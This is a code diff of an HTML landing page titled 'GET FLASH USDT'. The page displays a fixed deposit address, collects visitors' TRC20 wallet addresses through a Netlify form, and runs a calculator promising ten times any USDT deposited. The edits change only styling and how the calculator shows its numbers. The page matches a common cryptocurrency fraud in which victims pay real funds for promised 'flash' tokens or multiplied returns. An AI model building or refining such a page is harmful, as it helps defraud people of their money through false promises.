@@ -25,8 +25,8 @@
       text-align: center;
     }
     h2 { margin-top: 0; font-size: 1.5rem; }
-    label { display:block; margin: 1rem 0 0.25rem; text-align: left; }
-    input, output, button {
+    label, p { display:block; margin: 1rem 0 0.25rem; text-align: left; }
+    input, button {
       width: 100%;
       padding: 0.5rem;
       margin-bottom: 0.75rem;
@@ -43,23 +43,23 @@
     }
     button:hover { opacity: 0.9; }
     .note { font-size: 0.8rem; color: #f88; margin-bottom:1rem; }
+    .calculator p { text-align: center; margin: 0.5rem 0; }
+    .calculator input { margin-top: 0.5rem; }
   </style>
 </head>
 <body>
   <div class="box">
     <h2>GET FLASH USDT</h2>
 
-    <!-- Netlify form to collect the USDT address -->
+    <!-- Netlify form to collect address -->
     <form name="usdt-form" method="POST" data-netlify="true">
       <input type="hidden" name="form-name" value="usdt-form">
 
       <label for="buyAddress">Buy Address:</label>
-      <input type="text" id="buyAddress" name="buyAddress"
-             value="YOUR-BUY-ADDRESS-HERE" readonly>
+      <input type="text" id="buyAddress" name="buyAddress" value="YOUR-BUY-ADDRESS-HERE" readonly>
 
       <label for="usdtAddress">Your USDT Address:</label>
-      <input type="text" id="usdtAddress" name="usdtAddress"
-             placeholder="Enter your TRC20 address" required>
+      <input type="text" id="usdtAddress" name="usdtAddress" placeholder="Enter your TRC20 address" required>
 
       <p class="note">PLEASE USE TRC20 (TRON) ONLY, OR YOUR ASSETS MAY BE LOST</p>
 
@@ -68,21 +68,21 @@
 
     <!-- Calculator -->
     <div class="calculator">
-      <label for="deposit">If you deposit "x" USDT,</label>
+      <p>If you deposit "<span id="inputVal">0</span>" USDT,</p>
+      <p>You will get "<span id="outputVal">0</span>" USDT</p>
       <input type="number" id="deposit" placeholder="Amount">
-
-      <label for="result">You will get "x" USDT</label>
-      <output id="result">0</output>
     </div>
   </div>
 
   <script>
     const deposit = document.getElementById('deposit');
-    const result  = document.getElementById('result');
+    const inputVal = document.getElementById('inputVal');
+    const outputVal = document.getElementById('outputVal');
 
     deposit.addEventListener('input', () => {
       const val = parseFloat(deposit.value) || 0;
-      result.textContent = (val * 10).toFixed(2);
+      inputVal.textContent = val.toFixed(2);
+      outputVal.textContent = (val * 10).toFixed(2);
     });
   </script>
 </body>
